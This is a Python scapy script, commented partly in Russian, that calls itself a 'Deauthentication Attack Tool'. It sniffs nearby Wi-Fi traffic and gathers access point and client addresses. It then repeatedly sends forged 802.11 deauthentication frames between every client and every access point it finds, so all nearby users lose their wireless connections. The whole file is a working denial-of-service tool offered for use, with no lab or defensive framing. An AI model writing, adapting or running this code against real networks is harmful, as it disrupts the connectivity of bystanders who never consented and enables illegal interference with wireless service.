from scapy.all import Dot11, sniff, RadioTap, Dot11Deauth, sendp
from threading import Thread
import time
import sys

clients = set()
aps = set()
stop_sniffing = False
stop_deauth = False

def packet_handler(pkt):
    if pkt.haslayer(Dot11):
        # Если пакет от точки доступа
        if pkt.type == 0 and pkt.subtype == 8:  # Beacon frame
            aps.add(pkt.addr2.lower())
        
        # Если пакет от клиента
        if pkt.addr1 and pkt.addr1.lower() != "ff:ff:ff:ff:ff:ff":
            if pkt.addr1.lower() not in aps and pkt.addr1.lower() not in clients:
                clients.add(pkt.addr1.lower())
            
        if pkt.addr2 and pkt.addr2.lower() != "ff:ff:ff:ff:ff:ff":
            if pkt.addr2.lower() not in aps and pkt.addr2.lower() not in clients:
                clients.add(pkt.addr2.lower())

def sniff_packets(interface):
    print("*Sniffing...", interface)
    sniff(iface=interface, prn=packet_handler, store=0, stop_filter=lambda x: stop_sniffing)

def send_deauth(interface, count=0):
    global stop_deauth
    
    print("*Start sending deauth-frames...")
    print("*Ctrl+C to stop")
    
    sent = 0
    try:
        while not stop_deauth:
            if not clients or not aps:
                time.sleep(1)
                continue
            
            for client in list(clients):
                for ap in list(aps):
                    # Deauth от клиента к точке доступа
                    pkt = RadioTap() / Dot11(addr1=ap, addr2=client, addr3=ap) / Dot11Deauth()
                    sendp(pkt, iface=interface, verbose=0)
                    
                    # Deauth от точки доступа к клиенту
                    pkt = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
                    sendp(pkt, iface=interface, verbose=0)
                    
                    sent += 1
                    sys.stdout.write(f"\rPacket(s) sent: {sent}")
                    sys.stdout.flush()
                    
                    if count > 0 and sent >= count:
                        stop_deauth = True
                        break
                    
                    time.sleep(0.1)
                
                if stop_deauth:
                    break
            
            time.sleep(1)
            
    except KeyboardInterrupt:
        stop_deauth = True
    finally:
        print("\nAborted.")

def main():
    global stop_sniffing, stop_deauth
    
    parser = argparse.ArgumentParser(description="Deauthentication Attack Tool")
    parser.add_argument("-i", "--interface", required=True, help="Interface send from.")
    parser.add_argument("-c", "--count", type=int, default=0, 
                      help="Count frame(s) to send (from 0 to inf).")
    args = parser.parse_args()

    # Запускаем прослушивание в отдельном потоке
    sniffer = Thread(target=sniff_packets, args=(args.interface,))
    sniffer.daemon = True
    sniffer.start()

    # Даем время на сбор информации
    time.sleep(5)
    
    # Запускаем deauthentication атаку
    try:
        send_deauth(args.interface, args.count)
    # except KeyboardInterrupt:
    #     pass
    finally:
        stop_sniffing = True
        stop_deauth = True
        sniffer.join()
        print("Aborted.")

if __name__ == "__main__":
    import argparse
    main()
